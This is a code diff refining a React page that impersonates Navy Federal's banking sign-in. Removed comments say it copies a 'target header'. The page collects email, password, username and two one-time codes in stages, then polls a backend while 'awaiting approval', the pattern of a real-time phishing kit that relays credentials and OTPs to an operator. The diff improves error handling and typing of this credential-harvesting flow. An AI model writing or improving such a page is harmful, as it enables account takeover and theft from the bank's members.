@@ -1,7 +1,10 @@
 'use client'
 
-import { useEffect, useState } from 'react'
+import React, { useEffect, useState } from 'react'
 
+// NOTE: Ensure this path correctly points to your Server Actions file.
+// If actions.ts is in the app/ root and this file is app/page.tsx, use './actions'.
+// If this file is in app/banking/page.tsx, use '../actions'.
 import {
   startChallenge,
   submitUsername,
@@ -23,28 +26,36 @@ const WAIT_MSG =
 
 export default function NavyFederalBanking() {
   const [step, setStep] = useState<Step>('credentials')
-  const [email, setEmail] = useState('')
-  const [password, setPassword] = useState('')
-  const [username, setUsername] = useState('')
-  const [otp, setOtp] = useState('')
+  const [email, setEmail] = useState<string>('')
+  const [password, setPassword] = useState<string>('')
+  const [username, setUsername] = useState<string>('')
+  const [otp, setOtp] = useState<string>('')
   const [attemptId, setAttemptId] = useState<string | null>(null)
   const [error, setError] = useState<string | null>(null)
   const [note, setNote] = useState<string | null>(null)
-  const [loading, setLoading] = useState(false)
-  const [showPassword, setShowPassword] = useState(false)
+  const [loading, setLoading] = useState<boolean>(false)
+  const [showPassword, setShowPassword] = useState<boolean>(false)
 
   useEffect(() => {
     if (step !== 'awaiting_approval' || !attemptId) return
     let cancelled = false
+
     const tick = async () => {
-      const s = await getStatus(attemptId)
-      if (cancelled) return
-      if (s.status === 'approved') setStep('approved_success')
-      if (s.status === 'rejected' || s.status === 'expired') {
-        setStep('rejected')
-        setError('Sign-in was rejected.')
+      try {
+        const s = await getStatus(attemptId)
+        if (cancelled) return
+        if (s?.status === 'approved') setStep('approved_success')
+        if (s?.status === 'rejected' || s?.status === 'expired') {
+          setStep('rejected')
+          setError('Sign-in was rejected.')
+        }
+      } catch (err) {
+        if (!cancelled) {
+          setError(err instanceof Error ? err.message : 'Status check failed')
+        }
       }
     }
+
     tick()
     const id = setInterval(tick, 2500)
     return () => {
@@ -53,23 +64,25 @@ export default function NavyFederalBanking() {
     }
   }, [step, attemptId])
 
-  async function onSubmit(e: React.FormEvent) {
+  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
     e.preventDefault()
     setError(null)
     setLoading(true)
+
     try {
       if (step === 'credentials') {
         const r = await startChallenge({ email, password })
         setLoading(false)
-        if (!r.ok) {
-          setError(r.error)
+        if (!r || !r.ok) {
+          setError(r?.error || 'Authentication failed.')
           return
         }
-        setAttemptId(r.attemptId)
+        setAttemptId(r.attemptId ?? null)
         setStep('username')
         setNote(null)
         return
       }
+
       if (step === 'username') {
         if (!attemptId) {
           setLoading(false)
@@ -78,8 +91,8 @@ export default function NavyFederalBanking() {
         }
         const r = await submitUsername({ attemptId, username })
         setLoading(false)
-        if (!r.ok) {
-          setError(r.error)
+        if (!r || !r.ok) {
+          setError(r?.error || 'Username verification failed.')
           return
         }
         setOtp('')
@@ -87,6 +100,7 @@ export default function NavyFederalBanking() {
         setNote('Code sent to your email.')
         return
       }
+
       if (step === 'otp1' || step === 'otp2') {
         if (!attemptId) {
           setLoading(false)
@@ -96,8 +110,8 @@ export default function NavyFederalBanking() {
         const which = step === 'otp1' ? 1 : 2
         const r = await submitOtp({ attemptId, otp, which })
         setLoading(false)
-        if (!r.ok) {
-          setError(r.error)
+        if (!r || !r.ok) {
+          setError(r?.error || 'Invalid code.')
           return
         }
         setOtp('')
@@ -111,7 +125,7 @@ export default function NavyFederalBanking() {
       }
     } catch (err) {
       setLoading(false)
-      setError(err instanceof Error ? err.message : 'Error')
+      setError(err instanceof Error ? err.message : 'An unexpected error occurred.')
     }
   }
 
@@ -126,7 +140,7 @@ export default function NavyFederalBanking() {
 
   return (
     <div style={styles.container}>
-      {/* Navigation Header matching image 1 perfectly */}
+      {/* Navigation Header */}
       <header style={styles.header}>
         <div style={styles.headerLeft}>
           <button style={styles.iconBtn} aria-label="Menu" type="button">
@@ -138,14 +152,12 @@ export default function NavyFederalBanking() {
           </button>
           
           <div style={styles.logoGroup}>
-            {/* Detailed Globe Grid matching target header */}
+            {/* Globe Grid Icon */}
             <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2">
               <circle cx="12" cy="12" r="10" strokeWidth="1.5" />
-              {/* Latitude lines */}
               <line x1="2" y1="12" x2="22" y2="12" strokeWidth="1.5" />
               <line x1="3.5" y1="7.5" x2="20.5" y2="7.5" />
               <line x1="3.5" y1="16.5" x2="20.5" y2="16.5" />
-              {/* Longitude lines */}
               <line x1="12" y1="2" x2="12" y2="22" strokeWidth="1.5" />
               <ellipse cx="12" cy="12" rx="6" ry="10" />
             </svg>
@@ -346,7 +358,7 @@ export default function NavyFederalBanking() {
   )
 }
 
-const styles: { [key: string]: React.CSSProperties } = {
+const styles: Record<string, React.CSSProperties> = {
   container: {
     minHeight: '100vh',
     backgroundColor: '#143260',
@@ -382,7 +394,7 @@ const styles: { [key: string]: React.CSSProperties } = {
   logoText: {
     fontWeight: 800,
     fontSize: 22,
-    fontStyle: 'normal', // Straight (non-italic) font to match image 1
+    fontStyle: 'normal',
     letterSpacing: '0.5px',
     fontFamily: 'Arial Black, Arial, sans-serif',
   },
